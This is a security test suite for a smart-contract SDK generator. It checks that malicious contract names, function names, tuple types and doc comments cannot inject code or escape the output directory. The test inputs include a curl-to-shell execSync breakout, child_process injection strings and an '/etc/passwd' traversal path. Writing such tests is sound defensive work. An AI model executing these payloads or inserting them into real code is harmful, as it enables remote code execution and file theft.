/**
 * @testCategory security
 * @blockchainRequired false
 * @transactional false
 * @description Code-injection and path-traversal protections in the SDK
 *              generator. Attacker-controlled contract/function names (and tuple
 *              names derived from internalType) must never break out of the
 *              generated source or escape the output directory.
 */

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const {
  generate,
  generateFromArtifacts,
  generateTransactionalTestJs,
  assertSafeIdentifier,
} = require("../../src/generator");
const { logSuite, logTest } = require("../verbose-logger");

function _tmpOut() {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "qcgen-inj-"));
  return path.join(tmp, "out");
}

describe("Security: generator code-injection & path-traversal", () => {
  logSuite("Security: generator code-injection & path-traversal");

  it("assertSafeIdentifier rejects breakout strings and reserved words", () => {
    logTest("assertSafeIdentifier rejects breakout strings and reserved words", {});
    assert.throws(() => assertSafeIdentifier('Evil"; console.log(1); //', "contract name"));
    assert.throws(() => assertSafeIdentifier("../../etc/passwd", "contract name"));
    assert.throws(() => assertSafeIdentifier("with-dash", "contract name"));
    assert.throws(() => assertSafeIdentifier("__proto__", "contract name"));
    assert.throws(() => assertSafeIdentifier("class", "contract name"));
    assert.throws(() => assertSafeIdentifier("", "contract name"));
    assert.throws(() => assertSafeIdentifier(123, "contract name"));
    // Positive: valid identifiers are returned unchanged.
    assert.equal(assertSafeIdentifier("TestToken", "contract name"), "TestToken");
    assert.equal(assertSafeIdentifier("_balanceOf$2", "fn"), "_balanceOf$2");
  });

  it("rejects a malicious contractName (negative)", () => {
    logTest("rejects a malicious contractName (negative)", {});
    const abi = [{ type: "function", name: "ok", stateMutability: "view", inputs: [], outputs: [] }];
    assert.throws(
      () =>
        generateFromArtifacts({
          outDir: _tmpOut(),
          lang: "ts",
          artifacts: [{ contractName: 'Evil { static x = require("child_process"); } //', abi, bytecode: "0x00" }],
        }),
      /Unsafe contract name|reserved word/i,
    );
  });

  it("rejects a path-traversal contractName (negative)", () => {
    logTest("rejects a path-traversal contractName (negative)", {});
    const abi = [{ type: "function", name: "ok", stateMutability: "view", inputs: [], outputs: [] }];
    assert.throws(
      () =>
        generateFromArtifacts({
          outDir: _tmpOut(),
          lang: "ts",
          artifacts: [{ contractName: "../../evil", abi, bytecode: "0x00" }],
        }),
      /Unsafe contract name/i,
    );
  });

  it("rejects a malicious ABI function name (negative)", () => {
    logTest("rejects a malicious ABI function name (negative)", {});
    const abi = [
      { type: "function", name: 'foo(){}; const x = 1; bar', stateMutability: "view", inputs: [], outputs: [] },
    ];
    assert.throws(
      () =>
        generateFromArtifacts({
          outDir: _tmpOut(),
          lang: "ts",
          artifacts: [{ contractName: "Good", abi, bytecode: "0x00" }],
        }),
      /Unsafe ABI function name/i,
    );
    // Also covered by the transactional-test generator entry point.
    assert.throws(
      () => generateTransactionalTestJs({ contractName: "Good", abi, bytecode: "0x00" }),
      /Unsafe ABI function name/i,
    );
  });

  it("sanitizes malicious tuple names derived from internalType (negative-input, safe-output)", () => {
    logTest("sanitizes malicious tuple names derived from internalType", {});
    const outDir = _tmpOut();
    const abi = [
      {
        type: "function",
        name: "getStruct",
        stateMutability: "view",
        inputs: [],
        outputs: [
          {
            name: "s",
            type: "tuple",
            internalType: 'struct Evil"]; const pwned = 1; //[',
            components: [{ name: "a", type: "uint256" }],
          },
        ],
      },
    ];
    const res = generateFromArtifacts({ outDir, lang: "ts", artifacts: [{ contractName: "Holder", abi, bytecode: "0x00" }] });
    const contractSrc = fs.readFileSync(res.contracts[0].contractFile, "utf8");
    // The tuple type name is derived from the attacker-controlled internalType.
    // It MUST be emitted as a valid, sanitized TS identifier (the raw payload may
    // only survive inside the escaped ABI JSON string literal, never as code).
    const typeDecls = [...contractSrc.matchAll(/export type ([^\s=]+)\s*=/g)].map((m) => m[1]);
    assert.ok(typeDecls.length >= 1, "a struct type should be generated");
    for (const id of typeDecls) {
      assert.match(id, /^[A-Za-z_$][A-Za-z0-9_$]*$/, `tuple type identifier must be sanitized: ${id}`);
    }
  });

  it("neutralizes a NatSpec doc-comment breakout in contract & function docs (negative)", () => {
    logTest("neutralizes a NatSpec doc-comment breakout", {});
    const payload = `Legit text */ require('child_process').execSync('curl evil|sh'); /* keep`;
    const abi = [{ type: "function", name: "transfer", stateMutability: "nonpayable", inputs: [], outputs: [] }];
    const docs = { contract: payload, functions: { transfer: payload } };

    for (const lang of ["ts", "js"]) {
      const res = generateFromArtifacts({
        outDir: _tmpOut(),
        lang,
        artifacts: [{ contractName: "Doc", abi, bytecode: "0x00", docs }],
      });
      const src = fs.readFileSync(res.contracts[0].contractFile, "utf8");
      // The comment terminator must be neutralized so it cannot close the JSDoc
      // block early; the payload may only survive as inert comment text.
      assert.ok(!src.includes("*/ require"), `[${lang}] doc breakout must be neutralized`);
      assert.ok(src.includes("* /"), `[${lang}] escaped terminator should be present`);
      // Belt-and-suspenders: every '*/' in the file must be a real JSDoc close,
      // i.e. it is the last non-space token on its line (' */').
      for (const line of src.split(/\r?\n/g)) {
        const idx = line.indexOf("*/");
        if (idx !== -1) {
          assert.match(line.trimEnd(), /\*\/$/, `unexpected mid-line */ (possible breakout): ${line}`);
        }
      }
    }
  });

  it("renders a benign NatSpec doc normally (positive)", () => {
    logTest("renders a benign NatSpec doc normally", {});
    const abi = [{ type: "function", name: "transfer", stateMutability: "nonpayable", inputs: [], outputs: [] }];
    const docs = { contract: "Transfers tokens between accounts.", functions: { transfer: "Moves amount to recipient." } };
    const res = generateFromArtifacts({
      outDir: _tmpOut(),
      lang: "ts",
      artifacts: [{ contractName: "Doc", abi, bytecode: "0x00", docs }],
    });
    const src = fs.readFileSync(res.contracts[0].contractFile, "utf8");
    assert.ok(src.includes("* Transfers tokens between accounts."), "benign contract doc should render");
    assert.ok(src.includes("* Moves amount to recipient."), "benign function doc should render");
  });

  it("generates valid output and preserves legitimate identifiers (positive)", () => {
    logTest("generates valid output and preserves legitimate identifiers (positive)", {});
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "qcgen-ok-"));
    const abiPath = path.join(tmp, "Test.abi.json");
    const binPath = path.join(tmp, "Test.bin");
    const outDir = path.join(tmp, "out");
    const abi = [
      {
        type: "function",
        name: "balanceOf",
        stateMutability: "view",
        inputs: [{ name: "account", type: "address" }],
        outputs: [{ name: "", type: "uint256" }],
      },
    ];
    fs.writeFileSync(abiPath, JSON.stringify(abi), "utf8");
    fs.writeFileSync(binPath, "0x6000", "utf8");
    const res = generate({ abiPath, binPath, outDir, contractName: "TestToken" });
    const src = fs.readFileSync(res.contractFile, "utf8");
    assert.ok(src.includes("export class TestToken"));
    assert.ok(src.includes("async balanceOf"));
    // All generated files must live inside outDir (no traversal).
    for (const f of [res.contractFile, res.factoryFile, res.typesFile, res.indexFile]) {
      assert.ok(path.resolve(f).startsWith(path.resolve(outDir)), `${f} must be inside outDir`);
    }
  });
});
